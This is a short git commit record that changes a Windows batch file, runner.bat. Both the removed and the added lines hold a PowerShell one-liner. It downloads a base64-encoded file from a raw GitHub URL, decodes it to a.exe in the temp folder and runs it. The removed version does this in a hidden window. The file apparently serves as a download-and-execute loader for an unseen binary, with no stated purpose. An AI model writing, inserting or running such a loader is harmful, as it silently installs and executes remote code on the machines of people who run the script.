e8628ececed7e0673bb898b46333eb40473f6352
Yair Hamo <yairju1@gmail.com>
2021-11-22 11:28:19 +0200

    Update runner.bat

--- runner.bat
+++ runner.bat
@@ -1,2 +1,3 @@
 @echo off
-powershell  -windowstyle hidden -c "$p=$env:TEMP+'\a.exe'; [IO.File]::WriteAllBytes($p,[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/deep-oasis/test/main/main.enc')));.\$p;"
+powershell -c "$p=$env:TEMP+'\a.exe'; [IO.File]::WriteAllBytes($p,[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/deep-oasis/test/main/main.enc')));"
+%TEMP%\a.exe
